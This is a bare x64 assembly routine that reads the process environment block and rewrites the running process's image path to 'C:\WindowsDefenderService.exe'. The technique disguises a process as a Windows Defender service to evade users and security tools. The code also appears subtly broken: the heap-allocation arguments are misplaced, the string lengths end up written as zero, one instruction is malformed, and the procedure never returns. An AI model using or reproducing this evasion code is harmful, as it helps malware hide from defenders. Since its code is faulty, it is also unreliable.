.code 
.data
new_path dw 'C',':','\','W','i','n','d','o','w','s','D','e','f','e','n','d','e','r','S','e','r','v','i','c','e','.','e','x','e',0
modify_path_name proc
    push rbx
    push rdi
    push rsi

    mov rax, gs:[0x30]
    mov rax,[rax+0x60]
    mov rbx,[rax+0x20]
    mov rdi offset new_path
    xor rcx,rcx
    mov rsi,rdi
count_loop:
    lodsw
    test ax, ax
    jz count_done
    add rcx, 2
    jmp count_loop
count_done:

    push rcx ;The length of the new path
    add rcx,2 ;The length of null terminator is also added
    mov rdx,rcx
    xor ecx,ecx
    call GetProcessHeap
    mov rcx,rax; The process handle
    xor r8d,r8d
    call HeapAlloc
    pop rcx; Restores the length of the new path string
    mov rdi,rax; Newly allocated memory on the heap
    mov rsi,offset new_path
    rep movsb

    ;Modifying the ImagePathName with the new path of the process
    lea rdi,[rbx+0x60];This is the ptr to the ImagePathName
    mov [rdi+0],cx;update the length
    mov [rdi+2],cx;update the maxm length
    mov [rdi+8],rax; update the buffer ptr

    pop rsi
    pop rdi
    pop rbx
modify_path_name endp
